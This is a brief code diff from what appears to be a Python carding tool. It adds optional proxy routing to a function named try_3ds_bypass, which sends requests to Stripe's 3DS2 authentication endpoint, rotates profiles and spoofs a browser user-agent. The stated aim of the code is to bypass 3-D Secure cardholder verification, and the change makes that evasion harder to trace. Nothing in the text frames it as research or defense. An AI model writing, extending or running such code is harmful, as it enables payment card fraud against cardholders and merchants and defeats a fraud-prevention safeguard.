@@ -48,7 +48,7 @@ HEADERS = {
     "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
 }
 
-async def try_3ds_bypass(session, source: str, pk: str) -> dict:
+async def try_3ds_bypass(session, source: str, pk: str, proxy: str = None) -> dict:
     """Try 3DS bypass with profile rotation"""
     
     # Strategy 1: Profile rotation (try 10 profiles)
@@ -68,7 +68,8 @@ async def try_3ds_bypass(session, source: str, pk: str) -> dict:
             async with session.post(
                 "https://api.stripe.com/v1/3ds2/authenticate",
                 headers=HEADERS,
-                data=auth_body
+                data=auth_body,
+                proxy=proxy
             ) as r:
                 auth_result = await r.json()
             
